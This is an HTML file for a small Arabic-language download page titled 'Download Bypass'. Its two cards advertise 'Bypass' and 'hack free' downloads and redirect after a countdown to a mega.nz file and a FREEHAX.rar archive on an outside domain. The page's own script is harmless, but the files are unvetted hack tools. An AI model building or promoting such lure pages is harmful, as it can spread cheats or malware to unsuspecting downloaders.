[index.html](https://github.com/user-attachments/files/24691988/index.html)
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>موقع تحميل - مثل Uptodown</title>
<style>
  *{box-sizing:border-box}
  body{
    margin:0;
    font-family: "Tahoma", Arial, sans-serif;
    background:#f6f7fb;
    color:#222;
  }

  /* Header */
  header{
    background:#1b1f3a;
    color:#fff;
    padding:18px 20px;
  }
  header .top{
    display:flex;
    align-items:center;
    justify-content:space-between;
    gap:15px;
    flex-wrap:wrap;
  }
  header h1{
    margin:0;
    font-size:20px;
  }
  header p{
    margin:5px 0 0;
    font-size:14px;
    color:#d1d4e0;
  }

  /* Search */
  .search{
    width:100%;
    display:flex;
    justify-content:center;
    margin-top:15px;
  }
  .search input{
    width:90%;
    max-width:650px;
    padding:12px 16px;
    border-radius:12px;
    border:1px solid #d7d7d7;
    font-size:16px;
    outline:none;
  }

  /* Main */
  .container{
    max-width:1200px;
    margin:auto;
    padding:20px;
  }

  .apps{
    display:grid;
    grid-template-columns:repeat(auto-fill, minmax(240px, 1fr));
    gap:18px;
  }

  .app{
    background:#fff;
    border-radius:16px;
    padding:16px;
    box-shadow:0 6px 18px rgba(0,0,0,.08);
    transition:.3s;
    position:relative;
  }
  .app:hover{ transform:translateY(-5px); }

  .app img{
    width:72px;
    height:72px;
    border-radius:18px;
    object-fit:cover;
  }

  .app h3{
    margin:10px 0 5px;
    font-size:16px;
  }
  .app p{
    margin:0;
    font-size:13px;
    color:#555;
    line-height:1.4;
  }

  .stars{
    margin:10px 0;
    color:#ffb400;
    font-size:14px;
  }

  .download-btn{
    display:inline-block;
    margin-top:12px;
    background:#3b82f6;
    color:#fff;
    padding:10px 14px;
    border-radius:12px;
    text-decoration:none;
    font-weight:600;
  }
  .download-btn:hover{ background:#2563eb; }

  /* Footer */
  footer{
    background:#1b1f3a;
    color:#fff;
    text-align:center;
    padding:16px;
    margin-top:20px;
  }

  /* Modal */
  .modal{
    display:none;
    position:fixed;
    inset:0;
    background:rgba(0,0,0,.6);
    justify-content:center;
    align-items:center;
    z-index:999;
  }
  .modal-content{
    background:#fff;
    padding:22px;
    border-radius:14px;
    width:90%;
    max-width:380px;
    text-align:center;
  }
  .progress{
    width:100%;
    background:#eee;
    border-radius:10px;
    overflow:hidden;
    margin-top:15px;
  }
  .progress-bar{
    width:0;
    height:14px;
    background:#4cd137;
  }

  /* Responsive */
  @media (max-width:600px){
    header .top{ flex-direction:column; align-items:flex-start; }
    .search input{ width:95%; }
  }
</style>
</head>
<body>

<header>
  <div class="top">
    <div>
      <h1>Download Bypass</h1>
      <p>Download Bypass Free</p>
    </div>
  </div>

  <div class="search">
    <input type="text" id="search" placeholder="..." onkeyup="searchApps()">
  </div>
</header>

<div class="container">
  <div class="apps" id="apps">

    <!-- Card 1 -->
    <div class="app" data-name="app one">
      <img src="https://cdn.discordapp.com/attachments/1458202783634424035/1462186209949257738/p.png?ex=696d4686&is=696bf506&hm=613c82071318e9887a1d599a451ce0b2b63ce18ecc7608e558dee1d8cb2cf84b&">
      <h3>Bypass h3>
      <p>Download Bypass.</p>
      <div class="stars">★★★★☆</div>
      <a class="download-btn" onclick="startDownload('https://mega.nz/file/Ld1j2QKS#8LIhbrQ2mSidx2Iy2Ts0-t1DNeuwwBJfRs_L2zvGnwQ')">تحميل</a>
    </div>

    <!-- Card 2 -->
    <div class="app" data-name="app two">
      <img src="https://cdn.discordapp.com/attachments/1458202783634424035/1462186448529657967/p_1.png?ex=696d46bf&is=696bf53f&hm=94230d72e08962e7547d8d1165051c26ec2ad88ebcdc822c36f2b752f4db930b&">
      <h3>Download hack free>
      <p>Download hack.</p>
      <div class="stars">★★★☆☆</div>
      <a class="download-btn" onclick="startDownload('https://biianhlong.io.vn/update/software/FREEHAX.rar')">تحميل</a>
    </div>

  </div>
</div>

<!-- Modal -->
<div class="modal" id="modal">
  <div class="modal-content">
    <h3>⏳ جاري التحضير للتحميل</h3>
    <p id="counter">التحميل بعد 5 ثوانٍ</p>
    <div class="progress">
      <div class="progress-bar" id="bar"></div>
    </div>
  </div>
</div>

<footer>
  © 2026 AboWaleed - Top 1
</footer>

<script>
let realLink = "";

function startDownload(link){
  realLink = link;
  document.getElementById("modal").style.display="flex";

  let time = 5;
  let bar = document.getElementById("bar");
  let counter = document.getElementById("counter");
  let width = 0;

  let timer = setInterval(()=>{
    time--;
    width += 20;
    bar.style.width = width + "%";
    counter.innerText = "التحميل بعد " + time + " ثوانٍ";

    if(time <= 0){
      clearInterval(timer);
      window.location.href = realLink;
    }
  },1000);
}

function searchApps(){
  let input = document.getElementById("search").value.toLowerCase();
  let apps = document.querySelectorAll(".app");

  apps.forEach(app=>{
    let name = app.getAttribute("data-name");
    let title = app.querySelector("h3").innerText.toLowerCase();
    app.style.display = (name.includes(input) || title.includes(input)) ? "block" : "none";
  });
}
</script>

</body>
</html>
